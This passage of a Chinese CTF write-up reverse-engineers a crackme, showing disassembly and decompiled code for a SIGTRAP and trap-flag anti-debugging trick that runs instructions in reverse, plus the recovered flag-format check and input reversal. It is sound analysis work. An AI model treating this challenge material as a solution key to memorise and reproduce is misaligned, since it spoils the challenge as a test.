<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000638E6BC424B8</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424B8 loc_638E6BC424B8:                       <span class="comment">; CODE XREF: .text:0000638E6BC424BC↓j</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424B8                                         <span class="comment">; .text:0000638E6BC424CA↓j ...</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424B8                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbx</span>+<span class="number">17h</span>], <span class="number">7Dh</span> <span class="comment">; &#x27;&#125;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424BC                 <span class="keyword">jnz</span>     short loc_638E6BC424B8</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424BE                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">17h</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424C1                 <span class="keyword">call</span>    _strlen</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424C6                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424CA                 <span class="keyword">jnz</span>     short loc_638E6BC424B8</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424CC                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>+<span class="number">4</span>], <span class="number">7Bh</span> <span class="comment">; &#x27;&#123;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424D0                 <span class="keyword">jnz</span>     short loc_638E6BC424B8</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424D2                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>+<span class="number">3</span>], <span class="number">67h</span> <span class="comment">; &#x27;g&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424D6                 <span class="keyword">jnz</span>     short loc_638E6BC424B8</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424D8                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>+<span class="number">2</span>], <span class="number">61h</span> <span class="comment">; &#x27;a&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424DC                 <span class="keyword">jnz</span>     short loc_638E6BC424B8</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424DE                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>+<span class="number">1</span>], <span class="number">6Ch</span> <span class="comment">; &#x27;l&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424E2                 <span class="keyword">jnz</span>     short loc_638E6BC424B8</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424E4                 <span class="keyword">mov</span>     <span class="built_in">rbx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424E7                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="number">66h</span> <span class="comment">; &#x27;f&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424EA                 <span class="keyword">xor</span>     <span class="built_in">ebp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424EC                 <span class="keyword">jz</span>      short loc_638E6BC424AC</span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424EE                 <span class="keyword">test</span>    <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424F1                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424F5                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424F6                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>0000638E6BC424F7                 <span class="keyword">vfnmadd213sd</span> <span class="built_in">xmm7</span>, <span class="built_in">xmm0</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">28h</span>]</span><br></pre></td></tr></table></figure>
<p>这个代码块主要比较了flag的格式，得知flag长度为0x18（24），然后又回到main，跳转到下一个正向执行的代码块，在最后的jnz并未跳转之后继续向下执行，不久就卡死并退出了，尝试分析其他能正常反编译的函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sub_10A0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v0; <span class="comment">// kr00_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __getcallerseflags();</span><br><span class="line">  __writeeflags(v0 ^ <span class="number">0x100</span>);										<span class="comment">//修改了EFLAGS，触发SIGTRAP，干扰调试</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sub_10B0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// kr00_8</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">v2</span>;</span> <span class="comment">// [rsp+8h] [rbp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2.sa_mask, <span class="number">0</span>, <span class="number">0x90u</span>LL);</span><br><span class="line">  v2.sa_flags = <span class="number">4</span>;</span><br><span class="line">  v2.sa_handler = (<span class="type">__sighandler_t</span>)sub_1410;							<span class="comment">//信号SIGTRAP的处理函数</span></span><br><span class="line">  result = sigaction(<span class="number">5</span>, &amp;v2, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( result &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">  v1 = __readeflags();</span><br><span class="line">  __writeeflags(v1 ^ <span class="number">0x100</span>);										<span class="comment">//同上</span></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">sub_1410</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v10; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v11; <span class="comment">// cl</span></span><br><span class="line"></span><br><span class="line">  v3 = *(_QWORD *)(a3 + <span class="number">168</span>);</span><br><span class="line">  result = (<span class="type">unsigned</span> __int64)&amp;unk_1098;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt;= (<span class="type">unsigned</span> __int64)&amp;unk_1098 &amp;&amp; v3 &lt; (<span class="type">unsigned</span> __int64)term_proc )		<span class="comment">//如果rip在.text区段内</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v3 - (_QWORD)&amp;unk_1098;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)byte_2040[(v3 - (<span class="type">unsigned</span> __int64)&amp;unk_1098) &gt;&gt; <span class="number">3</span>];</span><br><span class="line">    <span class="keyword">if</span> ( _bittest((<span class="type">const</span> <span class="type">int</span> *)&amp;result, ((_BYTE)v3 - (<span class="type">unsigned</span> __int8)&amp;unk_1098) &amp; <span class="number">7</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = v3 - <span class="number">1</span>;</span><br><span class="line">      v8 = v6 - <span class="number">1</span>;</span><br><span class="line">      v9 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v10 = v8;</span><br><span class="line">        v11 = v8--;</span><br><span class="line">        v9 += (byte_2040[v10 &gt;&gt; <span class="number">3</span>] &gt;&gt; (v11 &amp; <span class="number">7</span>)) &amp; <span class="number">1</span>;						<span class="comment">//byte_2040用于存储跳转规则，这里计算了要逆向的步数</span></span><br><span class="line">        result = v7--;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v9 != <span class="number">2</span> );</span><br><span class="line">      *(_QWORD *)(a3 + <span class="number">168</span>) = result;									<span class="comment">//修改rip返回地址</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>推测这几个能正常编译的函数控制了整个程序其他部分代码的执行顺序，就像一个逻辑分发器，每条汇编指令都由这个分发器判断下一条的地址，而非顺序执行，整个程序的.text区段从0x10A0起始，先是两个逻辑支撑函数sub10A0和sub10B0，紧跟着的就是main的倒置汇编指令，接着是start函数（地址0x1320）和几个其他函数，然后是用于处理信号和计算返回地址的sub1410，跟着又是一段倒置的汇编指令，判断了flag的基本结构（flag{和}以及24字节的长度），再之后就是sub14FE以及一大串倒置的汇编指令（推测是加密函数的倒置），对main以及其他被混淆的函数进行倒置重排，分析出程序的逻辑：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>000000000000131E                 <span class="keyword">xchg</span>    <span class="built_in">ax</span>, <span class="built_in">ax</span><span class="number">.</span>text:<span class="number">0000000000001314</span>                 <span class="keyword">nop</span>     <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>+<span class="number">00000000h</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001314</span>                 <span class="built_in">db</span>      <span class="number">2Eh</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001312</span>                 <span class="keyword">mov</span>     <span class="built_in">al</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001312</span> loc_1312:                               <span class="comment">; DATA XREF: start+14↓o</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001312</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001310</span>                 <span class="keyword">inc</span>     <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000130F                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001308</span>                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, aInputYourFlag <span class="comment">; &quot;Input your flag:&quot; ;加载字符串</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001306</span>                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012FF                 <span class="keyword">lea</span>     <span class="built_in">rbx</span>, byte_4080</span><br><span class="line"><span class="symbol">.text:</span>00000000000012F8                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">100h</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012F3                 <span class="keyword">call</span>    _printf <span class="comment">;打印字符串</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012EC                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, aS         <span class="comment">; &quot;%s&quot; ;加载读取输入</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012EA                 <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012E7                 <span class="keyword">mov</span>     <span class="built_in">rsi</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012E2                 <span class="keyword">call</span>    ___isoc23_scanf <span class="comment">;读取输入</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012DF                 <span class="keyword">mov</span>     <span class="built_in">rdi</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012DA                 <span class="keyword">call</span>    sub_14FE <span class="comment">;flag格式验证函数</span></span><br><span class="line">——————————————————————————————————————————————————————————————————————————————————————</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001512</span>                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, [<span class="built_in">rdi</span>-<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001512</span> <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001510</span>                 <span class="keyword">jmp</span>     short loc_151F</span><br><span class="line"><span class="symbol">.text:</span><span class="number">000000000000150D</span>                 <span class="keyword">nop</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001502</span>                 <span class="keyword">nop</span>     <span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>+<span class="number">00000000h</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000001502</span>                 <span class="built_in">db</span>      <span class="number">66h</span>, <span class="number">66h</span>, <span class="number">2Eh</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014FE                 <span class="keyword">vxorpd</span>  <span class="built_in">xmm0</span>, <span class="built_in">xmm0</span>, <span class="built_in">xmm0</span><span class="number">.</span>text:00000000000014FE loc_14FE:                               <span class="comment">; CODE XREF: .text:00000000000012DA↑p</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014FE</span><br><span class="line"><span class="symbol">.text:</span>00000000000014F7                 <span class="keyword">vfnmadd213sd</span> <span class="built_in">xmm7</span>, <span class="built_in">xmm0</span>, <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">rsp</span>+<span class="number">28h</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000000000014F6                 <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014F5                 <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014F1                 <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014EE                 <span class="keyword">test</span>    <span class="built_in">rdi</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014EC                 <span class="keyword">jz</span>      short loc_14AC</span><br><span class="line"><span class="symbol">.text:</span>00000000000014EA                 <span class="keyword">xor</span>     <span class="built_in">ebp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014E7                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>], <span class="number">66h</span> <span class="comment">; &#x27;f&#x27; ;比较 flag&#123; 头</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014E4                 <span class="keyword">mov</span>     <span class="built_in">rbx</span>, <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014E2                 <span class="keyword">jnz</span>     short loc_14B8</span><br><span class="line"><span class="symbol">.text:</span>00000000000014DE                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>+<span class="number">1</span>], <span class="number">6Ch</span> <span class="comment">; &#x27;l&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014DC                 <span class="keyword">jnz</span>     short loc_14B8</span><br><span class="line"><span class="symbol">.text:</span>00000000000014D8                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>+<span class="number">2</span>], <span class="number">61h</span> <span class="comment">; &#x27;a&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014D6                 <span class="keyword">jnz</span>     short loc_14B8</span><br><span class="line"><span class="symbol">.text:</span>00000000000014D2                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>+<span class="number">3</span>], <span class="number">67h</span> <span class="comment">; &#x27;g&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014D0                 <span class="keyword">jnz</span>     short loc_14B8</span><br><span class="line"><span class="symbol">.text:</span>00000000000014CC                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdi</span>+<span class="number">4</span>], <span class="number">7Bh</span> <span class="comment">; &#x27;&#123;&#x27;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014CA                 <span class="keyword">jnz</span>     short loc_14B8</span><br><span class="line"><span class="symbol">.text:</span>00000000000014C6                 <span class="keyword">lea</span>     <span class="built_in">rdi</span>, [<span class="built_in">rdi</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000000000014C1                 <span class="keyword">call</span>    _strlen</span><br><span class="line"><span class="symbol">.text:</span>00000000000014BE                 <span class="keyword">cmp</span>     <span class="built_in">eax</span>, <span class="number">17h</span> <span class="comment">;比较字符串长度是否为23字节</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014BC                 <span class="keyword">jnz</span>     short loc_14B8</span><br><span class="line"><span class="symbol">.text:</span>00000000000014B8                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rbx</span>+<span class="number">17h</span>], <span class="number">7Dh</span> <span class="comment">; &#x27;&#125;&#x27; ;比较第24字节是否为flag尾 &#125;</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014B8                                         <span class="comment">; .text:00000000000014CA↓j ...</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014B8 loc_14B8:                               <span class="comment">; CODE XREF: .text:00000000000014BC↓j</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014B8</span><br><span class="line"><span class="symbol">.text:</span>00000000000014B4                 <span class="keyword">setz</span>    <span class="built_in">bpl</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014B0                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014AE                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014AD                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014AC                 <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014AC loc_14AC:                               <span class="comment">; CODE XREF: .text:00000000000014EC↓j</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014AC</span><br><span class="line"><span class="symbol">.text:</span>00000000000014AC <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014AB                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014A9                 <span class="keyword">xor</span>     <span class="built_in">ebp</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014A5                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014A3                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014A2                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014A1                 <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014A1 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000014A0                 <span class="keyword">retn</span></span><br><span class="line">——————————————————————————————————————————————————————————————————————————————————————</span><br><span class="line"><span class="symbol">.text:</span>00000000000012D8                 <span class="keyword">test</span>    <span class="built_in">al</span>, <span class="built_in">al</span> <span class="comment">;如果符合格式则不为零</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012D2                 <span class="keyword">jz</span>      loc_115D <span class="comment">;符合格式则不跳转</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012CB                 <span class="keyword">cmp</span>     <span class="built_in">cs</span>:byte_4080, <span class="number">0</span> <span class="comment">;检测输入的字符串是否为空</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012C8                 <span class="keyword">mov</span>     <span class="built_in">rdx</span>, <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012C8 loc_12C8:                               <span class="comment">; CODE XREF: .text:00000000000012B9↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012C8</span><br><span class="line"><span class="symbol">.text:</span>00000000000012C6                 <span class="keyword">jz</span>      short loc_125F <span class="comment">;如果为空则跳转</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012C3                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">rdx</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012BF                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, [<span class="built_in">rdx</span>+<span class="number">1</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000000000012BB                 <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>+<span class="number">1</span>], <span class="number">0</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012B9                 <span class="keyword">jnz</span>     short loc_12C8</span><br><span class="line"><span class="symbol">.text:</span>00000000000012B6                 <span class="keyword">cmp</span>     <span class="built_in">rbx</span>, <span class="built_in">rax</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012B0                 <span class="keyword">jnb</span>     loc_111E</span><br><span class="line"><span class="symbol">.text:</span>00000000000012B0 loc_12B0:                               <span class="comment">; CODE XREF: .text:000000000000128F↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012B0</span><br><span class="line"><span class="symbol">.text:</span>00000000000012A9                 <span class="keyword">lea</span>     <span class="built_in">rdx</span>, byte_4080 <span class="comment">;把输入的字符串倒过来，比如输入123456</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012A6                 <span class="keyword">movzx</span>   <span class="built_in">ecx</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rdx</span>] <span class="comment">;倒序转换后就是654321</span></span><br><span class="line"><span class="symbol">.text:</span>00000000000012A3                 <span class="keyword">movzx</span>   <span class="built_in">esi</span>, <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="symbol">.text:</span>000000000000129F                 <span class="keyword">add</span>     <span class="built_in">rdx</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.text:</span>000000000000129B                 